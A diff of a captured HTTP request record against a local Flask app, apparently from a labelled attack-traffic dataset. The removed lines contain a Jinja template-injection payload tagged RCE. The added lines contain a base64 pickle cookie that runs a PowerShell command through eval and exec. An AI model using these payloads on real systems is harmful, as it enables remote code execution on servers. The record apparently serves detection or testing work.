@@ -1,31 +1,23 @@
     {
         "request": {
             "headers": {
-                "Host": "127.0.0.1:5000",
-                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
-                "Accept-Encoding": "gzip, deflate, br",
                 "Accept": "*/*",
                 "Connection": "keep-alive",
-                "Accept-Language": "de",
-                "Sec-Fetch-Site": "none",
+                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
                 "Sec-Fetch-Mode": "same-origin",
-                "Sec-Fetch-User": "?1",
+                "Content-Length": "0",
                 "Sec-Fetch-Dest": "document",
-                "Set-Cookie": "['ck=Ra2Zey89Ohi79Bq_OakI_bILKXbBRe3S-0qcBYj9AFrsiIHkjCjEnOQnB8086CXr4znqDesa2tqSpZB7eXVtyQ; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:12:17 GMT', 'uu=sQWDuekvCGolsDYqOfJ6vvRfX7eJcMH3c7RwRMvgit3jW6ufAMZSXJzlB8CEf79rld5HTn0nAc5o3I9ZGm0G-Q; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:12:17 GMT', 'session=e2fb7984-14fa-4391-bf0c-e57653365d41; Expires=Mon, 21 Nov 2022 18:42:17 GMT']",
-                "Date": "Mon, 21 Nov 2022 18:12:17 GMT"
+                "Accept-Language": "de",
+                "Sec-Fetch-User": "?1",
+                "Date": "Mon, 21 Nov 2022 18:12:59 GMT",
+                "Host": "127.0.0.1:5000",
+                "Cookie": "username=gASVygAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIyuKGV4ZWMoJycnCmltcG9ydCBvcwpvcy5zeXN0ZW0oInBvd2Vyc2hlbGwgZWNobyAnaGVsbG8gd29ybGQnIikKCmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IG5hbWVkdHVwbGUKVXNlciA9IG5hbWVkdHVwbGUoJ1VzZXInLCBbJ3VzZXJuYW1lJ10pCicnJyksIFVzZXIodXNlcm5hbWU9J01pbGRyZWQnKSlbLTFdlIWUUpQu",
+                "Set-Cookie": "['ck=sikRVh3Vf4VQj58ArAMWrxh52fRIsFg-5TuRKDObNSa26wqFHRiO71wO4WJzHa8tv0hQfho0w2JYBjqWI9S9Yg; Domain=localhost:5000; Expires=Wed, 21 Dec 2022 18:12:59 GMT', 'uu=sbTMPpY1wPnraGYx0yxbNwv15bHLcfWLiVKel16MX3MftP8r-CBqW4CvnFehXLePYLKlLUjWhcms6etfSFt6tg; Domain=localhost:5000; Expires=Tue, 06 Dec 2022 18:12:59 GMT', 'session=2914e8e1-148b-4de7-a76e-c891ccf49614; Expires=Mon, 21 Nov 2022 18:42:59 GMT']",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Sec-Fetch-Site": "none"
             },
-            "method": "GET",
-            "url": "http://127.0.0.1:5000/greet/%7B%7Bget_flashed_messages.__globals__.__builtins__.__import__('os').system%7D%7D",
-            "body": "",
-            "Attack_Tag": "RCE"
-        },
-        "response": {
-            "status": "200 OK",
-            "headers": {
-                "Content-Type": "text/html; charset=utf-8",
-                "Content-Length": "48"
-            },
-            "status_code": 200,
-            "body": "<h2>Hello &lt;built-in function system&gt;!</h2>"
+            "url": "http://127.0.0.1:5000/cookielogin",
+            "method": "POST",
+            "body": ""
         }
     }
